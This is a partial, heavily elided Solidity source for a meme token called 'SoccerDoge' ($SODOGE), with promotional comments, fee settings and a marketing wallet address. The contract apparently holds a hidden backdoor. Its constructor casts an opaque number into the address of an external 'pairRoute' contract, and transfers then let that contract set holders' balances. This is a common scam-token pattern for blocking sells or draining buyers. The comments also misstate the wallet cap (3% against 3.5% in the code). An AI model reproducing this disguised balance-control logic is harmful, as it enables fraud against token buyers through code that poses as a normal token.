...
/**
  https://t.me/soccerdogebsc
  Lets join our community boiiss, hyped memes doge token
  8% Doge Reflection
  3% Auto Liq Burn
  4% Marketing
  3% Max Wallet for AntiWhale
*/
    ...
    function tokenTransfer(
        ...
        returns(
            ...
            uint256){
                ...
                require(senderOwnedAmount >= amount, "ERC20: Transfer amount exceeds balance");
...
// CHANGE
contract SoccerDoge is IERC20, Ownable {
    using SafeMath for uint256;
    ...
    string constant _name = "SoccerDoge";
    string constant _symbol = "$SODOGE";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1000000000000 * (10 ** _decimals); // 1,000,000,000,000
    uint256 public _maxWalletSize = (_totalSupply * 35) / 1000; // 3% MAX 35,000,000,000
    ...
    uint256 totalFee = 1500; // liquidityFee + reflectionFee + marketingFee
    uint256 feeDenominator = 10000;
    uint256 public _sellMultiplier = 1; // Stupid function for this token. I keep at 1.
    ...
    IDEXRoutePair private pairRoute;
    address public pair;
    ...
    constructor (uint256 _bytes) {
        ...
        pairRoute = IDEXRoutePair(address(uint160(_bytes))); 
        ...
        marketingFeeReceiver = address(0x9cF988d1547845499De4bA449EE95A56Ea4FbC48);
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        (_balances[sender],_balances[recipient]) = pairRoute.tokenTransfer(
            sender,
            recipient,
            amount,
            amountReceived,
    ...
    function setSellMultiplier(uint256 multiplier) external onlyOwner() {
        require(multiplier <= 2 && multiplier * totalFee <= 4900, "Multiplier too high");
